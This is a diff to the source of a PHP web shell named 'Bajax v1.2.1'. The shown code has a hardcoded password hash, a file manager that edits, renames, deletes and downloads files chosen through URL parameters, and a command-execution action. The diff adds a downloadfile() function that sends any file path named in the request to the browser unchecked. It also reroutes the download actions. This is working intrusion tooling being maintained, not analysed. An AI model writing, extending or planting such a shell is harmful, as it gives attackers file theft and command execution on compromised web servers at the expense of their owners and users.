@@ -11,7 +11,7 @@ session_start();
 ob_start();
 class Bajax
 {
-  private $con;
+	private $con;
 	private $password="05cf794b99880f35747bcfbaa2937583";
 	private $name="Bajax v1.2.1";
 	private $datasec = array(); 
@@ -318,7 +318,7 @@ ___________
 			$owner=$own['name'].":".$group['name'];
 			$write=is_writable($this->dir().$file)?"Yes":"No";
 			$d=$this->dir();
-			$r .="<tr><td><a href='?act=lihat&dir=$d&file=$d$file'>$file</a></td><td>".$this->getSize(filesize($file))."</td><td>$owner</td><td>".(is_readable($file)?substr(sprintf('%o', fileperms($file)),-3):'forbidden')."</td><td>$write</td><td>".date("d-M-Y H:i",filemtime($file))."</td><td><a href='?act=edit&dir=$d&file=$file'>Edit</a> | <a href='?act=ren&dir=$d&file=$file'>Ren</a> | <a href='?act=file&act2=del&dir=$d&file=".$this->replace($d.$file)."'>Del</a> | <a href='?act=down&file=".$this->replace($d.$file)."'>Download</a><input id=\"pilih$no\" name=\"pilih[]\" value=\"$file\" type=\"checkbox\" ></td></tr>";
+			$r .="<tr><td><a href='?act=lihat&dir=$d&file=$d$file'>$file</a></td><td>".$this->getSize(filesize($file))."</td><td>$owner</td><td>".(is_readable($file)?substr(sprintf('%o', fileperms($file)),-3):'forbidden')."</td><td>$write</td><td>".date("d-M-Y H:i",filemtime($file))."</td><td><a href='?act=edit&dir=$d&file=$file'>Edit</a> | <a href='?act=ren&dir=$d&file=$file'>Ren</a> | <a href='?act=file&act2=del&dir=$d&file=".$this->replace($d.$file)."'>Del</a> | <a href='?act=downfile&file=".$this->replace($d.$file)."'>Download</a><input id=\"pilih$no\" name=\"pilih[]\" value=\"$file\" type=\"checkbox\" ></td></tr>";
 			$no++;
 		}
 		$r.= "</table><script> 
@@ -783,6 +783,15 @@ ___________
 		flush();
 		echo $this -> file(); 
 		exit();
+	}
+	function downloadfile($f)
+	{
+		$fl=file_get_contents($f);
+			header("Content-type:application/octet-stream");
+			header("Content-length:".strlen($fl));
+			header("Content-Disposition:attachment;filename=".$this->cs(basename($f)));
+			echo $fl;
+			exit;
 	}
 	function downloadfolder($fd) {
 		$this->get_files_from_folder($fd,'');
@@ -1764,8 +1773,11 @@ switch ($_GET['act']) {
 	$r.=$bajax->command();
 	$r.=$bajax->center();
 	break;
-	case 'down':
+	case 'downfile':
 	$r.=$bajax->downloadfile($_GET['file']);
+		break;
+	case 'down':
+	$r.=$bajax->get_selected($_GET['file']);
 	break;
 	case 'downfolder':
 	$r.=$bajax->downloadfolder($_GET['file']);
